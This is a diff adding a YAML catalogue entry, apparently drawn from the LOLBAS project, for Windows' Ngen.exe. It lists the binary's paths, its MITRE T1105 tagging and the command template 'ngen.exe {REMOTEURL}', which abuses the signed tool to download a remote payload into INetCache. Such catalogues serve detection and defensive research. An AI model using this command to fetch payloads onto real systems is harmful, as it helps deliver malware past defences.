@@ -1,0 +1,88 @@
+id: lolbas/T1NCaW5hcmllcy9OZ2VuLnltbA/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: Ngen.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+commands:
+- template: ngen.exe {REMOTEURL}
+  comment: Downloads payload from remote server using the Microsoft Native Image Generator utility.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Ngen/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Ngen.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/Ngen.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Ngen.exe\nDescription: Microsoft Native Image Generator.\nAuthor: Avihay\
+        \ Eldad\nCreated: 2024-02-19\nCommands:\n  - Command: ngen.exe {REMOTEURL}\n    Description: Downloads\
+        \ payload from remote server using the Microsoft Native Image Generator utility.\n    Usecase:\
+        \ It will download a remote payload and place it in INetCache.\n    Category: Download\n    Privileges:\
+        \ User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Download:\
+        \ INetCache\nFull_Path:\n  - Path: C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ngen.exe\n\
+        \  - Path: C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ngen.exe\n  - Path: C:\\Windows\\\
+        Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe\n  - Path: C:\\Windows\\Microsoft.NET\\Framework64\\\
+        v4.0.30319\\ngen.exe\nAcknowledgement:\n  - Person: Avihay Eldad\n    Handle: '@AvihayEldad'\n"
+      document_sha256: sha256:6ef4f262994b5b18ae99eea2987a125e96e12ec771bbd75b9ecde0edeb98a29b
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Ngen/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:cb05be93f62ef13d7208055ed3d18630816507b25e4a058a83cbfd314d78ace8
